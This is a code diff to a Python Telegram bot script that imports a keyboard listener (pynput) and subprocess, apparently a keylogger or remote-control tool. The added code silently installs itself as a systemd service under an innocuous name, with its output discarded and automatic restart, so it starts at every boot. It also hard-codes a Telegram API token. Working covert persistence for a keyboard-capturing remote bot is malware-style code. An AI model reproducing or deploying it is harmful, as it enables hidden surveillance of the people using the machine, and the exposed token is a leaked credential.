@@ -1,10 +1,55 @@
+import os
+import sys
+import getpass
 import telebot
 import subprocess
 import threading
 import time
-import os
 from pynput import keyboard
 
+# Функция для создания и запуска systemd-сервиса
+def setup_autostart():
+    service_content = f"""[Unit]
+    Description=Telegram Bot Service
+    After=network.target
+
+    [Service]
+    ExecStart=/usr/bin/python3 {sys.argv[0]}
+    Restart=always
+    User={getpass.getuser()}
+    StandardOutput=null
+    StandardError=null
+
+    [Install]
+    WantedBy=multi-user.target
+    """
+    
+    service_path = "/etc/systemd/system/telegram_bot.service"
+    
+    # Проверяем, существует ли сервисный файл
+    if not os.path.exists(service_path):
+        try:
+            # Создаем файл сервиса
+            with open(service_path, "w") as service_file:
+                service_file.write(service_content)
+            
+            # Активируем и запускаем сервис
+            os.system("systemctl daemon-reload")
+            os.system("systemctl enable telegram_bot.service")
+            os.system("systemctl start telegram_bot.service")
+
+            print("Сервис успешно создан и запущен. Теперь бот будет запускаться при загрузке системы.")
+
+        except PermissionError:
+            print("Запустите скрипт с правами администратора (sudo), чтобы создать сервис.")
+            sys.exit(1)  # Останавливаем выполнение, если нет прав
+    else:
+        print("Сервис уже настроен для автозагрузки.")
+
+# Запускаем функцию автозагрузки
+setup_autostart()
+
+# Далее идет остальной код бота
 API_TOKEN = '7713553121:AAHdYxg42QAFP5ZkRjkrKp3LbErB9ilRuEk'
 bot = telebot.TeleBot(API_TOKEN)
 
